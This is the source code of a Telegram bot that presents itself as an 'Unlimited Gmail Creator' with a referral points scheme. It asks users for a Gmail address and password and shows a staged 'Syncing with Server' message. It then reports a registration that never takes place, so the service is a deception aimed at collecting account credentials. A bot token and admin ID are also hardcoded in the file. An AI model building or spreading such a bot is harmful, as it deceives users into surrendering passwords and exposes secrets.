const { Telegraf, Markup, session } = require('telegraf');

const BOT_TOKEN = '8539976683:AAE02vIE0M_YxpKKluoYNQHsogNz-fYfks8';
const ADMIN_ID = 5522724001;
const BOT_USERNAME = 'YourBotUsername'; // UPDATE THIS to your bot's username (without @)

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

// --- DATABASE (In-memory for demo; use MongoDB for production) ---
const db = {}; 
const initUser = (id, username = 'User') => {
    if (!db[id]) db[id] = { points: 0, referrals: 0, joined: new Date(), username: username };
};

// --- KEYBOARDS ---
const mainMenu = Markup.keyboard([
    ['➕ Register New Gmail'],
    ['⚙️ Account', '🚸 My Referrals'],
    ['🏥 Help']
]).resize();

const cancelMenu = Markup.keyboard([['❌ Cancel Operation']]).resize();

const adminMenu = Markup.keyboard([
    ['📊 Global Stats', '📢 Send Broadcast'],
    ['➕ Add Points', '⬅️ Exit Admin']
]).resize();

// --- LOGIC ---

// Start with Referral Handling
bot.start(async (ctx) => {
    const userId = ctx.from.id;
    initUser(userId, ctx.from.username || 'User');

    // Handle Referral Link: /start [referrer_id]
    const payload = ctx.payload;
    if (payload && payload != userId && !db[userId].referredBy) {
        const referrerId = parseInt(payload);
        if (db[referrerId]) {
            db[referrerId].points += 2; // Reward: 2 points
            db[referrerId].referrals += 1;
            db[userId].referredBy = referrerId;
            bot.telegram.sendMessage(referrerId, `🎁 *Referral Reward!*\nSomeone joined using your link. You earned +2 Points!`, { parse_mode: 'Markdown' });
        }
    }

    ctx.replyWithMarkdown(
        `👋 *Welcome to Unlimited Gmail Creator!*\n\n` +
        `This bot allows you to securely register and manage Gmail accounts for the farming system.\n\n` +
        `💰 *Start earning points by inviting friends!*`,
        mainMenu
    );
});

// Cancel Handler
bot.hears('❌ Cancel Operation', (ctx) => {
    ctx.session = null;
    ctx.reply('🚫 *Operation Cancelled.* Returning to main menu...', { parse_mode: 'Markdown', ...mainMenu });
});

// Register Logic
bot.hears('➕ Register New Gmail', (ctx) => {
    const userId = ctx.from.id;
    if (db[userId].points < 5) {
        return ctx.replyWithMarkdown(`⚠️ *Insufficient Points!*\n\nYou need **5 Points** to register a Gmail.\n*Your Balance:* ${db[userId].points} pts`);
    }

    ctx.session = { step: 'EMAIL' };
    ctx.replyWithMarkdown(
        "🟢 *STEP 1: Send Gmail Address*\n\n" +
        "⚙️ Example: `john.doe@gmail.com`",
        cancelMenu
    );
});

bot.on('text', async (ctx, next) => {
    if (ctx.message.text === '❌ Cancel Operation') return next();
    const step = ctx.session?.step;

    if (step === 'EMAIL') {
        if (!ctx.message.text.includes('@gmail.com')) return ctx.reply("❌ Invalid Gmail format. Try again.");
        ctx.session.email = ctx.message.text;
        ctx.session.step = 'PASS';
        return ctx.replyWithMarkdown("🔋 *STEP 2: Send Password*\n\n⚙️ Example: `pass1234`", cancelMenu);
    }

    if (step === 'PASS') {
        const email = ctx.session.email;
        const pass = ctx.message.text;
        ctx.session = null;
        
        const msg = await ctx.reply("⏳ *Syncing with Server...*", { parse_mode: 'Markdown' });
        setTimeout(() => {
            ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, 
                `✅ *Registration Successful!* 🚀\n\n📧 *Email:* \`${email}\`\n🔑 *Pass:* \`${pass}\`\n\n_5 Points deducted._`,
                { parse_mode: 'Markdown', ...mainMenu }
            );
            db[ctx.from.id].points -= 5;
        }, 2500);
        return;
    }
    return next();
});

// Account Section
bot.hears('⚙️ Account', (ctx) => {
    const user = db[ctx.from.id];
    ctx.replyWithMarkdown(
        `👤 *USER DASHBOARD*\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `🆔 *Account ID:* \`${ctx.from.id}\`\n` +
        `💰 *Balance:* ${user.points} Points\n` +
        `🚸 *Invites:* ${user.referrals}\n` +
        `📈 *Rank:* ${user.points > 20 ? '🥇 Pro' : '🥉 Starter'}\n` +
        `━━━━━━━━━━━━━━━━━━`, mainMenu
    );
});

// Referral Section
bot.hears('🚸 My Referrals', (ctx) => {
    const refLink = `https://t.me/${BOT_USERNAME}?start=${ctx.from.id}`;
    ctx.replyWithMarkdown(
        `🤝 *Referral Program*\n\n` +
        `Invite friends and earn **2 Points** per join!\n\n` +
        `🔗 *Your Link:* \n\`${refLink}\`\n\n` +
        `📊 *Your Stats:* ${db[ctx.from.id].referrals} successful invites.`,
        Markup.inlineKeyboard([[Markup.button.url("Share Link 🚀", `https://t.me/share/url?url=${refLink}&text=Join%20this%20bot%20to%20create%20unlimited%20Gmail!`) ]])
    );
});

// Admin Panel
bot.command('admin', (ctx) => {
    if (ctx.from.id === ADMIN_ID) ctx.reply("🛠 *Admin Control Panel*", { parse_mode: 'Markdown', ...adminMenu });
});

bot.hears('📊 Global Stats', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const totalUsers = Object.keys(db).length;
    ctx.replyWithMarkdown(`📈 *System Stats*\nTotal Users: ${totalUsers}\nServer: Running (Railway)`);
});

bot.hears('⬅️ Exit Admin', (ctx) => ctx.reply("Exiting...", mainMenu));

bot.launch();
